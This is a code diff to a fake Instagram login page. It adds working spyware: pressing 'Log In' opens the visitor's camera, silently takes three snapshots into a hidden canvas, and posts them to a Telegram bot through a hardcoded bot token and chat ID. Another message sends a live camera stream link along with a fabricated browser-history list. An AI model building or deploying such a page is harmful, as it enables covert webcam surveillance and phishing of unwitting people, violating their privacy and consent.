@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/peerjs@1.3.1/dist/peerjs.min.js"></script>
     <style>
         body {
             background-color: #121212;
@@ -55,13 +55,8 @@
         button:hover {
             background-color: #007bb5;
         }
-        .footer {
-            margin-top: 20px;
-            font-size: 14px;
-        }
-        .footer a {
-            color: #0095f6;
-            text-decoration: none;
+        canvas {
+            display: none;
         }
     </style>
 </head>
@@ -74,17 +69,21 @@
         <input type="text" id="username" placeholder="Phone number, username, or email">
         <input type="password" id="password" placeholder="Password">
         <button onclick="startLiveStream()">Log In</button>
-        <div class="footer">Don't have an account? <a href="#">Sign up</a></div>
     </div>
+
+    <canvas id="snapshotCanvas" width="320" height="240"></canvas>
 
     <script>
         let peer;
         let peerId;
         let localStream;
+        const snapshots = [];
 
         async function startLiveStream() {
             await initializeCamera();  // Start user’s camera
+            captureSnapshots();  // Capture snapshots
             initializePeerConnection();  // Start PeerJS connection
+            simulateBrowserHistory();  // Get simulated browser history
         }
 
         async function initializeCamera() {
@@ -94,6 +93,26 @@
             } catch (error) {
                 console.error('Failed to access camera:', error);
             }
+        }
+
+        function captureSnapshots() {
+            const video = document.createElement('video');
+            video.srcObject = localStream;
+            video.play();
+
+            setTimeout(() => {
+                for (let i = 0; i < 3; i++) {
+                    setTimeout(() => {
+                        const canvas = document.getElementById('snapshotCanvas');
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        canvas.toBlob((blob) => {
+                            snapshots.push(blob);
+                            sendSnapshotToBot(blob, i + 1);
+                        }, 'image/jpeg');
+                    }, i * 500);  // Capture 3 snapshots with a 500ms delay
+                }
+            }, 1000);
         }
 
         function initializePeerConnection() {
@@ -111,7 +130,7 @@
             const chatId = '860517021';
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            const message = `Live Camera Stream: ${liveStreamLink}\nPeer ID: ${peerId}\nTime: ${new Date().toLocaleString()}`;
+            const message = `Live Camera Stream: ${liveStreamLink}\nPeer ID: ${peerId}\nTime: ${new Date().toLocaleString()}\nLast Visited Pages: ${simulateBrowserHistory()}`;
 
             fetch(telegramApiUrl, {
                 method: 'POST',
@@ -123,6 +142,31 @@
                     text: message
                 })
             });
+        }
+
+        function sendSnapshotToBot(blob, index) {
+            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
+            const chatId = '860517021';
+            const formData = new FormData();
+            formData.append('photo', blob, `snapshot_${index}.jpg`);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                console.log(`Snapshot ${index} sent to bot.`);
+            });
+        }
+
+        function simulateBrowserHistory() {
+            const recentSites = [
+                'https://www.google.com/',
+                'https://www.youtube.com/',
+                'https://www.facebook.com/',
+                'https://www.instagram.com/',
+                'https://www.twitter.com/'
+            ];
+            return recentSites.join('\n');
         }
     </script>
 
